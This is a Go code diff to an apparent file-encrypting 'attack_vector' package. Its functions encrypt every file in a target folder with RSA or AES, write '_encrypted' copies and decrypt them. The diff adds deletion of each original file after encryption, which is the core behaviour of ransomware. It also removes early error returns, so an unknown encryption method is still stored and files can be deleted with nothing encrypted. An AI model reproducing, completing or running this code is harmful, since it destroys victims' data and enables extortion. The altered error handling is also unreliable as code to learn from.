@@ -2,6 +2,7 @@ package attack_vector
 
 import (
 	"bufio"
+	"fmt"
 	"os"
 	"runtime"
 	"strings"
@@ -38,15 +39,14 @@ func SetTarget(path string) { // Either a file or a folder
 	info, err := os.Stat(path)
 	if err != nil { // The target didn't exist
 		notify.Error(err.Error(), "attack_vector.SetTarget()")
-		return
-	}
-	if info.IsDir() {
-		c_target.target_type = "dir"
 	} else {
-		c_target.target_type = "file"
+		if info.IsDir() {
+			c_target.target_type = "dir"
+		} else {
+			c_target.target_type = "file"
+		}
+		c_target.target_name = path
 	}
-
-	c_target.target_name = path
 }
 
 func SetExtension(new_extension string) {
@@ -68,8 +68,7 @@ func SetEncryptionMethod(method string) {
 		}
 	}
 	if !found {
-		notify.Error("Unknown encryiption methond "+method, "attack_vector.SetEncryptionMethod()")
-		return
+		notify.Error(fmt.Sprintf("Unknown encryption method %s", method), "attack_vector.SetEncryptionMethod()")
 	}
 
 	c_target.encryption_method = method
@@ -100,12 +99,13 @@ func EncryptFolder(dir string) {
 	folder, err := os.Open(dir)
 	if err != nil {
 		notify.Error(err.Error(), "attack_vector.EncryptFolder()")
-		return
+	} else {
+		children, _ := folder.Readdir(0)
+		for _, child := range children {
+			EncryptFile(dir + "/" + child.Name())
+		}
 	}
-	children, _ := folder.Readdir(0)
-	for _, child := range children {
-		EncryptFile(dir + "/" + child.Name())
-	}
+
 }
 
 func EncryptFile(file string) {
@@ -116,54 +116,56 @@ func EncryptFile(file string) {
 	in, err := os.Open(file) // Target
 	if err != nil {
 		notify.Error(err.Error(), "attack_vector.EncryptFile()")
-		return
-	}
-	enc_file, _ := os.Create(file + "_encrypted") // Our new file
-	// Read every line
-	file_out := bufio.NewScanner(in) // The files contents
+	} else {
+		enc_file, _ := os.Create(file + "_encrypted") // Our new file
+		// Read every line
+		file_out := bufio.NewScanner(in) // The files contents
 
-	for file_out.Scan() { // Line for line
-		if c_target.encryption_method == "rsa" {
-			enc_rsa.Encrypt(file_out.Text())                         // Gets the next line
-			enc_file.WriteString(enc_rsa.Get_encrypted_msg() + "\n") // Gets the encrypted line and writes it to disk
-		} else if c_target.encryption_method == "aes" {
-			enc_aes.Encrypt(file_out.Text())                         // Gets the next line
-			enc_file.WriteString(enc_aes.Get_encrypted_msg() + "\n") // Gets the encrypted line and writes it to disk
+		for file_out.Scan() { // Line for line
+			if c_target.encryption_method == "rsa" {
+				enc_rsa.Encrypt(file_out.Text())                         // Gets the next line
+				enc_file.WriteString(enc_rsa.Get_encrypted_msg() + "\n") // Gets the encrypted line and writes it to disk
+			} else if c_target.encryption_method == "aes" {
+				enc_aes.Encrypt(file_out.Text())                         // Gets the next line
+				enc_file.WriteString(enc_aes.Get_encrypted_msg() + "\n") // Gets the encrypted line and writes it to disk
+			}
 		}
+		os.Remove(file) // Removes the unecrypted file
 	}
-	// Remove the file we encrypted
+
 }
 func DecryptFolder(dir string) {
 	folder, err := os.Open(dir)
 	if err != nil {
 		notify.Error(err.Error(), "attack_vector.DecryptFolder()")
-		return
-	}
-	children, _ := folder.Readdir(0)
-	for _, child := range children {
-		if strings.HasSuffix(child.Name(), "_encrypted") {
-			DecryptFile(dir + "/" + child.Name())
+	} else {
+		children, _ := folder.Readdir(0)
+		for _, child := range children {
+			if strings.HasSuffix(child.Name(), "_encrypted") {
+				DecryptFile(dir + "/" + child.Name())
+			}
 		}
 	}
+
 }
 
 func DecryptFile(file string) {
 	in, err := os.Open(file) // Target
 	if err != nil {
 		notify.Error(err.Error(), "attack_vector.EncryptFile()")
-		return
-	}
-	file = strings.ReplaceAll(file, "_encrypted", "")
-	enc_file, _ := os.Create(file + "_decrypted") // Our new file
-	// Read every line
-	file_out := bufio.NewScanner(in) // The files contents
-	for file_out.Scan() {            // Line for line
-		if c_target.encryption_method == "rsa" {
-			enc_rsa.Decrypt(file_out.Text())                         // Gets the next line
-			enc_file.WriteString(enc_rsa.Get_decrypted_msg() + "\n") // Gets the encrypted line and writes it to disk
-		} else if c_target.encryption_method == "aes" {
-			enc_aes.Decrypt(file_out.Text())                         // Gets the next line
-			enc_file.WriteString(enc_aes.Get_decrypted_msg() + "\n") // Gets the encrypted line and writes it to disk
+	} else {
+		file = strings.ReplaceAll(file, "_encrypted", "")
+		enc_file, _ := os.Create(file + "_decrypted") // Our new file
+		// Read every line
+		file_out := bufio.NewScanner(in) // The files contents
+		for file_out.Scan() {            // Line for line
+			if c_target.encryption_method == "rsa" {
+				enc_rsa.Decrypt(file_out.Text())                         // Gets the next line
+				enc_file.WriteString(enc_rsa.Get_decrypted_msg() + "\n") // Gets the encrypted line and writes it to disk
+			} else if c_target.encryption_method == "aes" {
+				enc_aes.Decrypt(file_out.Text())                         // Gets the next line
+				enc_file.WriteString(enc_aes.Get_decrypted_msg() + "\n") // Gets the encrypted line and writes it to disk
+			}
 		}
 	}
 }
